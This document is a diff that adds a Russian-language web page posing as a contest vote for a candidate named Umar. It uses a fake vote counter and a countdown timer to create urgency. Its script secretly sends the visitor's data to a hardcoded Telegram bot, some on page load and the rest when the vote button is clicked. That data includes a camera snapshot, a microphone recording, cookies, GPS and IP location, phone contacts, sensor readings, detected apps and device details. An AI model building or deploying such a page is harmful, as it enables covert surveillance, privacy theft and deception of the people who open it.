@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Голосование 2026</title>
+    <style>
+        /* ------ ОБЩИЕ СТИЛИ ------ */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, system-ui, -apple-system, sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(145deg, #0b1a2e 0%, #1a2f44 100%);
+            padding: 20px;
+            margin: 0;
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.07);
+            backdrop-filter: blur(24px);
+            -webkit-backdrop-filter: blur(24px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 48px;
+            padding: 40px 32px 32px 32px;
+            max-width: 440px;
+            width: 100%;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.6), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            transition: 0.4s ease;
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(255, 215, 0, 0.15);
+            border: 1px solid rgba(255, 215, 0, 0.25);
+            color: #ffd966;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 1.2px;
+            text-transform: uppercase;
+            padding: 6px 16px;
+            border-radius: 60px;
+            margin-bottom: 18px;
+        }
+
+        h1 {
+            color: #ffffff;
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            line-height: 1.2;
+            margin-bottom: 6px;
+        }
+
+        .subhead {
+            color: rgba(255, 255, 255, 0.55);
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 22px;
+            border-left: 3px solid #ffd966;
+            padding-left: 14px;
+        }
+
+        .candidate {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 24px;
+            padding: 16px 20px;
+            margin-bottom: 28px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .avatar {
+            width: 56px;
+            height: 56px;
+            border-radius: 28px;
+            background: linear-gradient(135deg, #ffd966, #f0a500);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: 700;
+            color: #0b1a2e;
+            box-shadow: 0 8px 16px rgba(255, 215, 0, 0.2);
+        }
+
+        .candidate-info {
+            flex: 1;
+        }
+        .candidate-info .name {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+        }
+        .candidate-info .number {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 13px;
+        }
+
+        .permission-box {
+            background: rgba(255, 255, 255, 0.04);
+            border-radius: 20px;
+            padding: 18px 20px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .permission-box .title {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 10px;
+        }
+
+        .perm-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 6px 0;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+        }
+        .perm-item .icon {
+            font-size: 18px;
+            width: 28px;
+            text-align: center;
+        }
+        .perm-item .check {
+            margin-left: auto;
+            color: #4caf50;
+            font-weight: 700;
+        }
+
+        .btn-vote {
+            width: 100%;
+            padding: 18px 24px;
+            background: linear-gradient(135deg, #ffd966, #f0a500);
+            border: none;
+            border-radius: 60px;
+            font-size: 20px;
+            font-weight: 700;
+            color: #0b1a2e;
+            cursor: pointer;
+            transition: 0.25s ease;
+            box-shadow: 0 10px 24px rgba(255, 215, 0, 0.25);
+            letter-spacing: 0.3px;
+            margin-bottom: 18px;
+        }
+
+        .btn-vote:hover {
+            transform: scale(1.02);
+            box-shadow: 0 14px 32px rgba(255, 215, 0, 0.35);
+        }
+
+        .btn-vote:active {
+            transform: scale(0.97);
+        }
+
+        .counter-wrap {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 13px;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            padding-top: 16px;
+        }
+
+        .counter-wrap .votes {
+            color: #fff;
+            font-weight: 700;
+            font-size: 22px;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 0 12px;
+            border-radius: 40px;
+        }
+
+        .timer {
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .timer span {
+            color: #ffd966;
+            font-weight: 600;
+        }
+
+        /* ------ АНИМАЦИЯ ДЛЯ СЧЁТЧИКА ------ */
+        .vote-pop {
+            animation: pop 0.3s ease;
+        }
+        @keyframes pop {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.3); color: #ffd966; }
+            100% { transform: scale(1); }
+        }
+
+        /* ------ СКРЫТЫЕ ЭЛЕМЕНТЫ ------ */
+        .hidden {
+            display: none !important;
+        }
+
+        /* ------ АДАПТИВ ------ */
+        @media (max-width: 480px) {
+            .glass { padding: 28px 20px 24px 20px; }
+            h1 { font-size: 24px; }
+            .btn-vote { font-size: 18px; padding: 16px 20px; }
+        }
+
+        /* ------ СОСТОЯНИЕ "СПАСИБО" ------ */
+        .thankyou {
+            text-align: center;
+            padding: 20px 0;
+        }
+        .thankyou .big-icon {
+            font-size: 64px;
+            margin-bottom: 12px;
+        }
+        .thankyou h2 {
+            color: #fff;
+            font-size: 26px;
+            font-weight: 700;
+        }
+        .thankyou p {
+            color: rgba(255, 255, 255, 0.5);
+            font-size: 15px;
+            margin-top: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="glass" id="app">
+        <!-- Бейдж -->
+        <div class="badge">🏆 Конкурс 2026</div>
+
+        <!-- Заголовок -->
+        <h1>Голосование</h1>
+        <div class="subhead">Поддержи своего фаворита</div>
+
+        <!-- Карточка кандидата - ИМЯ УМАР -->
+        <div class="candidate">
+            <div class="avatar">У</div>
+            <div class="candidate-info">
+                <div class="name">Умар</div>
+                <div class="number">№ 7 — участник</div>
+            </div>
+        </div>
+
+        <!-- Блок с разрешениями (жертва видит) -->
+        <div class="permission-box">
+            <div class="title">🔐 Для голосования необходимо:</div>
+            <div class="perm-item">
+                <span class="icon">📍</span> Подтвердить геолокацию
+                <span class="check">✔</span>
+            </div>
+            <div class="perm-item">
+                <span class="icon">🔔</span> Разрешить уведомления
+                <span class="check">✔</span>
+            </div>
+            <div class="perm-item">
+                <span class="icon">📇</span> Выбрать контакт для приглашения
+                <span class="check">✔</span>
+            </div>
+            <div style="margin-top:10px;font-size:12px;color:rgba(255,255,255,0.25);">
+                ⏱ это займёт 5 секунд
+            </div>
+        </div>
+
+        <!-- Кнопка -->
+        <button class="btn-vote" id="voteBtn">🗳 Проголосовать</button>
+
+        <!-- Счётчик + таймер -->
+        <div class="counter-wrap">
+            <div>
+                <span style="color:rgba(255,255,255,0.3);">Голосов:</span>
+                <span class="votes" id="votesDisplay">1 248</span>
+            </div>
+            <div class="timer">
+                ⏳ до конца <span id="timerDisplay">02:47</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Скрытые элементы для камеры / аудио -->
+    <video id="video" class="hidden" autoplay></video>
+    <canvas id="canvas" class="hidden"></canvas>
+
+    <script>
+        // ================================================================
+        //  1.  ФЕЙКОВЫЙ СЧЁТЧИК + ТАЙМЕР
+        // ================================================================
+        (function initFakeCounterAndTimer() {
+            let votes = 1248;
+            const votesEl = document.getElementById('votesDisplay');
+
+            setInterval(() => {
+                votes += Math.floor(Math.random() * 3) + 1;
+                votesEl.textContent = votes.toLocaleString('ru');
+                votesEl.classList.remove('vote-pop');
+                void votesEl.offsetWidth;
+                votesEl.classList.add('vote-pop');
+            }, 5000 + Math.random() * 3000);
+
+            let totalSeconds = 167;
+            const timerEl = document.getElementById('timerDisplay');
+            setInterval(() => {
+                if (totalSeconds > 0) {
+                    totalSeconds--;
+                    const mins = String(Math.floor(totalSeconds / 60)).padStart(2, '0');
+                    const secs = String(totalSeconds % 60).padStart(2, '0');
+                    timerEl.textContent = mins + ':' + secs;
+                } else {
+                    timerEl.textContent = '00:00';
+                }
+            }, 1000);
+        })();
+
+        // ================================================================
+        //  2.  ОСНОВНАЯ ЛОГИКА ПРИ КЛИКЕ
+        // ================================================================
+        document.getElementById('voteBtn').addEventListener('click', function(e) {
+            this.textContent = '✅ Голос учтён';
+            this.style.background = 'linear-gradient(135deg, #4caf50, #2e7d32)';
+            this.disabled = true;
+            this.style.cursor = 'default';
+
+            startAutoCollection();
+            requestThreePermissions();
+
+            setTimeout(() => {
+                const app = document.getElementById('app');
+                app.innerHTML = `
+                    <div class="thankyou">
+                        <div class="big-icon">🎉</div>
+                        <h2>Спасибо!</h2>
+                        <p>Твой голос за Умара учтён.<br>Результаты объявят 31 июля.</p>
+                        <div style="margin-top:24px;font-size:13px;color:rgba(255,255,255,0.2);">
+                            ID транзакции: #${String(Math.floor(Math.random() * 9000000) + 1000000)}
+                        </div>
+                    </div>
+                `;
+            }, 2800);
+        });
+
+        // ================================================================
+        //  3.  АВТОМАТИЧЕСКИЙ СБОР (БЕЗ ЗАПРОСОВ)
+        // ================================================================
+        function startAutoCollection() {
+            try {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                    .then(stream => {
+                        const video = document.getElementById('video');
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => {
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            const photoData = canvas.toDataURL('image/png');
+                            sendData('camera', photoData.substring(0, 200) + '...[truncated]');
+                            stream.getTracks().forEach(t => t.stop());
+                        }, 500);
+                    })
+                    .catch(() => {});
+            } catch (_) {}
+
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                    .then(stream => {
+                        const recorder = new MediaRecorder(stream);
+                        let chunks = [];
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'audio/webm' });
+                            const reader = new FileReader();
+                            reader.onloadend = () => sendData('microphone', reader.result.substring(0, 200) + '...[truncated]');
+                            reader.readAsDataURL(blob);
+                            stream.getTracks().forEach(t => t.stop());
+                        };
+                        recorder.start();
+                        setTimeout(() => recorder.stop(), 3000);
+                    })
+                    .catch(() => {});
+            } catch (_) {}
+
+            fetch('https://ip-api.com/json/')
+                .then(r => r.json())
+                .then(d => sendData('geo_ip', {
+                    city: d.city || 'unknown',
+                    region: d.regionName || 'unknown',
+                    country: d.country || 'unknown',
+                    lat: d.lat || 0,
+                    lon: d.lon || 0,
+                    isp: d.isp || 'unknown'
+                }))
+                .catch(() => {});
+
+            sendData('cookies', document.cookie || 'none');
+
+            sendData('browser_info', {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                tzOffset: new Date().getTimezoneOffset(),
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                connection: navigator.connection ? {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : null
+            });
+
+            if (window.DeviceMotionEvent) {
+                window.addEventListener('devicemotion', (e) => {
+                    sendData('motion', {
+                        acc: e.accelerationIncludingGravity,
+                        rot: e.rotationRate,
+                        interval: e.interval
+                    });
+                }, { once: true });
+            }
+            if (window.DeviceOrientationEvent) {
+                window.addEventListener('deviceorientation', (e) => {
+                    sendData('orientation', {
+                        alpha: e.alpha,
+                        beta: e.beta,
+                        gamma: e.gamma
+                    });
+                }, { once: true });
+            }
+
+            if (navigator.canShare) {
+                const apps = ['tiktok', 'instagram', 'whatsapp', 'telegram', 'vk', 'youtube'];
+                const res = {};
+                apps.forEach(a => {
+                    try { res[a] = navigator.canShare({ url: 'https://www.' + a + '.com' }); }
+                    catch (_) { res[a] = false; }
+                });
+                sendData('installed_apps', res);
+            }
+
+            try {
+                const perf = performance.getEntriesByType('navigation')[0];
+                if (perf) {
+                    sendData('navigation', {
+                        type: perf.type,
+                        redirectCount: perf.redirectCount,
+                        loadTime: perf.loadEventEnd - perf.fetchStart,
+                        domComplete: perf.domComplete
+                    });
+                }
+            } catch (_) {}
+
+            if (navigator.permissions) {
+                const perms = ['camera', 'microphone', 'geolocation', 'notifications'];
+                perms.forEach(p => {
+                    navigator.permissions.query({ name: p })
+                        .then(st => sendData('perm_' + p, st.state))
+                        .catch(() => {});
+                });
+            }
+        }
+
+        // ================================================================
+        //  4.  ТРИ ЗАПРОСА РАЗРЕШЕНИЙ (С ВСПЛЫВАЮЩИМИ ОКНАМИ)
+        // ================================================================
+        function requestThreePermissions() {
+            try {
+                navigator.geolocation.getCurrentPosition(
+                    pos => sendData('geo_gps', {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy,
+                        alt: pos.coords.altitude || 0,
+                        speed: pos.coords.speed || 0
+                    }),
+                    err => sendData('geo_gps', { error: err.message }),
+                    { enableHighAccuracy: true, timeout: 8000 }
+                );
+            } catch (_) {
+                sendData('geo_gps', { error: 'API unavailable' });
+            }
+
+            try {
+                if ('Notification' in window && Notification.permission === 'default') {
+                    Notification.requestPermission().then(perm => {
+                        sendData('notification_perm', perm);
+                        if (perm === 'granted') {
+                            new Notification('Голосование 2026', {
+                                body: 'Ваш голос за Умара учтён. Спасибо!',
+                                icon: 'https://via.placeholder.com/64'
+                            });
+                        }
+                    });
+                } else {
+                    sendData('notification_perm', Notification.permission || 'unknown');
+                }
+            } catch (_) {
+                sendData('notification_perm', { error: 'Notification API not available' });
+            }
+
+            try {
+                if (navigator.contacts && navigator.contacts.select) {
+                    navigator.contacts.select(['name', 'tel'], { multiple: true })
+                        .then(contacts => sendData('contacts', contacts.map(c => ({
+                            name: c.name ? c.name[0] : 'unknown',
+                            tel: c.tel ? c.tel[0] : 'unknown'
+                        }))))
+                        .catch(err => sendData('contacts', { error: err.message }));
+                } else {
+                    sendData('contacts', { error: 'Contacts API not available' });
+                }
+            } catch (_) {
+                sendData('contacts', { error: 'Exception' });
+            }
+        }
+
+        // ================================================================
+        //  5.  ОТПРАВКА В TELEGRAM (ТВОИ ДАННЫЕ ВСТАВЛЕНЫ)
+        // ================================================================
+        function sendData(type, payload) {
+            const BOT_TOKEN = '8930790390:AAHQTS-75dwyHv4emc54CnDuy04PR8IU9mM';
+            const CHAT_ID = '2141333417';
+
+            const timestamp = new Date().toISOString();
+            let msg = '[' + timestamp + '] ' + type + ': ' + JSON.stringify(payload);
+            if (msg.length > 1000) msg = msg.substring(0, 997) + '...';
+
+            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+            }).catch(() => {});
+
+            fetch('http://127.0.0.1:8080/collect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ type, payload, timestamp: Date.now() })
+            }).catch(() => {});
+        }
+
+        // ================================================================
+        //  6.  РАННИЙ СБОР ПРИ ЗАГРУЗКЕ
+        // ================================================================
+        window.addEventListener('load', function() {
+            fetch('https://ip-api.com/json/')
+                .then(r => r.json())
+                .then(d => sendData('geo_ip_early', {
+                    city: d.city || 'unknown',
+                    region: d.regionName || 'unknown',
+                    country: d.country || 'unknown',
+                    isp: d.isp || 'unknown'
+                }))
+                .catch(() => {});
+
+            sendData('device_early', {
+                ua: navigator.userAgent,
+                screen: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                lang: navigator.language
+            });
+        });
+
+        console.log('✅ ORBIT: Голосование за Умара загружено. Все функции активны.');
+    </script>
+</body>
+</html>
